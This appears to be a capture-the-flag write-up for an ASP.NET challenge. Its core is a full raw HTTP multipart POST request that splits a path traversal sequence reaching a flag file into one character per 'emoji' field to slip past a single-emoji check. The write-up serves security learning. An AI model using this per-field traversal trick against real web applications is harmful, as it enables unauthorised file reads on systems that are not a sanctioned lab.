# Deep-Fried-Inator

This is an ASP.net challenge which insecurely concatenates emojis for a path traversal vulnerability. 

After registering on the website by triggering the env variables to be dumped, we can send specific characters instead of emojis into the POST fields.

A winning condition is below. Note that we must have a separate field per character to ensure we don't trigger the check for a single emoji per field.

```
POST /submit HTTP/1.1
Host: 192.168.40.73:9001
Content-Length: 154644
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.40.73:9001
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4asVq5M5VwdyoW0t
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.40.73:9001/submit
Accept-Encoding: gzip, deflate, br
Cookie: deepfriedinator=CfDJ8H4z0aKHU9BFrPPPsD_6AeabI3D2RNRnnd3eU3SwVzBwYqGCwf9VLfEPms73P2jNATixzRSrjQUBFplYYrkAt1RiJjOtI40yyX_27kk5FRr7HpY0YdjyU8vMQJ4SALb5WN7UweQNmHF5tDwasyIEyUmEiEH4aAuyCQQaszs31eYTColf79u7-rFmm5iHyOt392yc1PapnRzM6B-j-xaXH0cHwbOTHlcn0s3XcpIcW2FDQ4O7PLZcsZSJ_2X0Ywy-Q5c5Tbgg1vdML7IkLb27eXcVhXtljCABx3MFHKyDi-6nTa428_IgwelzqX6hodHesQ
Connection: keep-alive

------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="file"; filename="Haller_profile_square.txt"
Content-Type: image/jpeg

     JFIF   H H     XExif  MM *            i       &                     $       $      ~     (S  NZ uQREPP (  ?  
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

/
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

.
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

.
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

/
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

.
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

.
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

/
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

.
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

.
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

/
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

f
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

l
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

a
------WebKitFormBoundary4asVq5M5VwdyoW0t
Content-Disposition: form-data; name="emoji"

g
------WebKitFormBoundary4asVq5M5VwdyoW0t--

```